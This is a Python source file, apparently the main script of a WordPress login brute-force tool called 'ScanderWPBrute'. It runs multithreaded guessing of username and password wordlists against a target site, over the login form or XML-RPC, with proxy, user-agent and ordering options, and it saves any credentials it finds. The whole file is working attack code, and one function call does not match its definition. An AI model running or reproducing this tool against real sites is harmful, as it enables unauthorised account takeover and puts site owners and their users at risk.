from func.style.print_banner import print_banner
from func.loads import load_list
from func.wpchecker.check_wp_credentials import check_wp_credentials
from func.argparse.parse_args import parse_args
from func.save.save_results import save_results
from pystyle import Colors, Colorate

from itertools import product
import concurrent.futures
import random
import time
import logging
import sys


def setup_logging(log_file, debug_mode):
    log_format = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    log_level = logging.DEBUG if debug_mode else logging.INFO

    logging.basicConfig(
        level=log_level,
        format=log_format,
        handlers=[
            logging.FileHandler(log_file),
            logging.StreamHandler(sys.stdout)
        ]
    )

    logger = logging.getLogger('ScanderWPBrute')
    logger.setLevel(log_level)
    fh = logging.FileHandler(log_file)
    fh.setLevel(log_level)
    ch = logging.StreamHandler()
    ch.setLevel(log_level)
    formatter = logging.Formatter(log_format)
    fh.setFormatter(formatter)
    ch.setFormatter(formatter)
    logger.addHandler(fh)
    logger.addHandler(ch)
    return logger


def brute_force(site_url, usernames, passwords, args, mode=1, max_threads=5, delay=0,
                batch_size=100, timeout=10, proxy=None, user_agent=None,
                verify_ssl=False, max_retries=3, xmlrpc=False):
    def attempt_login(username, password, attempt=1):
        if delay > 0:
            time.sleep(delay)
            
        try:
            success = check_wp_credentials(
                site_url, username, password,
                timeout=timeout,
                proxy=proxy,
                user_agent=user_agent,
                verify_ssl=verify_ssl,
                xmlrpc=xmlrpc
            )
            
            if success:
                logging.info(f"Success: Username: {username} Password: {password}")
                return True, username, password
            else:
                if not args.silent:
                    logging.debug(f"Failed: Username: {username} Password: {password}")
                return False, username, password
                
        except Exception as e:
            if attempt < max_retries:
                logging.warning(f"Attempt {attempt} failed, retrying... Error: {str(e)}")
                return attempt_login(username, password, attempt + 1)
            logging.error(f"Error testing {username}:{password} - {str(e)}")
            return False, username, password

    combinations = []
    
    if mode == 1:
        combinations = [(u, p) for u in usernames for p in passwords]
    elif mode == 2:
        combinations = [(u, p) for p in passwords for u in usernames]
    elif mode == 3:
        combinations = list(product(usernames, passwords))
    elif mode == 4:
        combinations = list(product(usernames, passwords))
        random.shuffle(combinations)

    found_credentials = []
    
    for i in range(0, len(combinations), batch_size):
        batch = combinations[i:i + batch_size]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = [
                executor.submit(attempt_login, username, password)
                for username, password in batch
            ]
            
            for future in concurrent.futures.as_completed(futures):
                success, username, password = future.result()
                if success:
                    found_credentials.append((username, password))
                    if args.exit_on_found:
                        executor.shutdown(wait=False)
                        return found_credentials
                        
    return found_credentials

def main():
    args = parse_args()
    setup_logging(args.log_file)
    
    try:
        usernames = load_list(args.usernames)
        passwords = load_list(args.passwords)
    except Exception as e:
        logging.error(f"Error loading wordlists: {str(e)}")
        return

    if not args.silent:
        logging.info(Colorate.Horizontal(Colors.blue_to_white, "[*] Starting WordPress security test with parameters:"))
        logging.info(Colorate.Horizontal(Colors.cyan_to_white, f"[+] Target URL: {args.url}"))
        logging.info(Colorate.Horizontal(Colors.cyan_to_white, f"[+] Usernames loaded: {len(usernames)}"))
        logging.info(Colorate.Horizontal(Colors.cyan_to_white, f"[+] Passwords loaded: {len(passwords)}"))
        logging.info(Colorate.Horizontal(Colors.cyan_to_white, f"[+] Thread count: {args.threads}"))
        logging.info(Colorate.Horizontal(Colors.cyan_to_white, f"[+] Mode: {args.mode}"))
        
    found_credentials = brute_force(
        args.url,
        usernames,
        passwords,
        args, 
        mode=args.mode,
        max_threads=args.threads,
        delay=args.delay,
        batch_size=args.batch_size,
        timeout=args.timeout,
        proxy=args.proxy,
        user_agent=args.user_agent,
        verify_ssl=args.verify_ssl,
        max_retries=args.max_retries,
        xmlrpc=args.xmlrpc
    )
    
    if found_credentials:
        logging.info(Colorate.Horizontal(Colors.green_to_white, "\n[+] Valid credentials found:"))
        for username, password in found_credentials:
            logging.info(Colorate.Horizontal(Colors.green_to_white, f"[+] Username: {username}"))
            logging.info(Colorate.Horizontal(Colors.green_to_white, f"[+] Password: {password}"))
            
        if args.output:
            save_results(found_credentials, args.output)
            logging.info(Colorate.Horizontal(Colors.green_to_white, f"\n[*] Results saved to: {args.output}"))
    else:
        logging.info(Colorate.Horizontal(Colors.red_to_white, "\n[-] No valid credentials found."))

if __name__ == "__main__":
    print_banner()
    main()